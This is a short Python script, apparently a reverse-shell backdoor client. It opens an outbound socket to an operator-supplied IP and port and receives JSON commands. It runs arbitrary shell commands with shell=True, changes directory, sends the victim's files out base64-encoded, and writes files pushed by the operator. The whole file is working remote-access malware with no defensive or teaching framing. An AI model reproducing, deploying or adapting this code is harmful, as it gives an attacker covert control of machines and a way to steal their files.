import base64
import optparse
import subprocess
import os
import json
import socket

class Socket:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect((ip,port))

	def shellcode(self,command):
		return subprocess.check_output(command,shell=True)


	def json_send(self,temp):
		temp2 = json.dumps(temp)
		self.connection.send(temp2)

	def json_rec(self):
		log = ""
		while 1==1:
			try:
				log = log + self.connection.recv(1024)
				return json.loads(log)
			except ValueError:
				continue

	def cd(self,path):
		os.chdir(path)
		return "cd " + path
	def save(self,path,direct):
		with open(path,"wb") as p:
			p.write(base64.b64decode(direct))
			return "Downloaded"

	def get(self,path):
		with open(path,"rb") as p:
			return base64.b64encode(p.read())

	def body(self):
		while 1==1:
			command = self.json_rec()
			try:
				if command[0] == "quit":
					self.connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					shellout = self.cd(command[1])

				elif command[0] == "download":
					shellout = self.get(command[1])

				elif command[0] == "upload":
					shellout = self.save(command[1],command[2])

				else:
					shellout = self.shellcode(command)
			except Exception:
				shellout = "Warning !"
			self.json_send(shellout)
		self.connection.close()
instance = Socket("public_ip_adress",port)#public enter ip adress and port
instance.body()
